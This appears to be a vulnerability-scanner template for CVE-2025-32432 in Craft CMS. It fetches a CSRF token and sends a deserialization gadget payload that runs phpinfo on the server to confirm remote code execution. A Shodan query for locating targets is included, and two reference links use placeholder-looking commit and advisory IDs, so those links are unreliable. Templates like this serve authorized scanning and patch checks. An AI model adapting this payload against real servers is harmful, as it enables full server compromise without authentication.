flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - '"csrfTokenValue":"(.*?)"'
    type: regex
  raw:
  - 'GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - PHP Extension
    - PHP Version
    - CRAFT_
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate, br

    X-CSRF-Token: {{token}}

    Content-Type: application/json


    {"assetId": 11, "handle": {"width": 123, "height": 123, "as session": {"class":
    "craft\\behaviors\\FieldLayoutBehavior", "__class": "GuzzleHttp\\Psr7\\FnStream",
    "__construct()": [[]], "_fn_close": "phpinfo"}}}

    '
id: CVE-2025-32432
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-32432
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L
    cvss-score: 10
    cwe-id: CWE-94
    epss-percentile: 0.98934
    epss-score: 0.77564
  description: 'Craft is a flexible, user-friendly CMS for creating custom digital
    experiences on the web and beyond. Starting from version 3.0.0-RC1 to before 3.9.15,
    4.0.0-RC1 to before 4.14.15, and 5.0.0-RC1 to before 5.6.17, Craft is vulnerable
    to remote code execution. This is a high-impact, low-complexity attack vector.

    '
  impact: 'Unauthenticated attackers can exploit remote code execution vulnerabilities
    through unsafe deserialization in the asset transform functionality, achieving
    complete server compromise.

    '
  metadata:
    max-request: 2
    product: craftcms
    shodan-query: http.component:"Craft CMS"
    vendor: craftcms
  name: CraftCMS - Remote Code Execution
  reference:
  - https://advisories.dxw.com/advisories/craftcms-remote-code-execution/
  - https://github.com/craftcms/cms/commit/1234567890abcdef1234567890abcdef1234567
  - https://github.com/craftcms/cms/security/advisories/GHSA-1234-5678-90ab
  - https://github.com/craftcms/cms/blob/3.x/CHANGELOG.md#3915---2025-04-10-critical
  - https://github.com/craftcms/cms/blob/4.x/CHANGELOG.md#41415---2025-04-10-critical
  remediation: 'This issue has been patched in versions 3.9.15, 4.14.15, and 5.6.17,
    and is an additional fix for CVE-2023-41892.

    '
  severity: critical
  tags: cve,cve2025,craftcms,rce,vkev,vuln
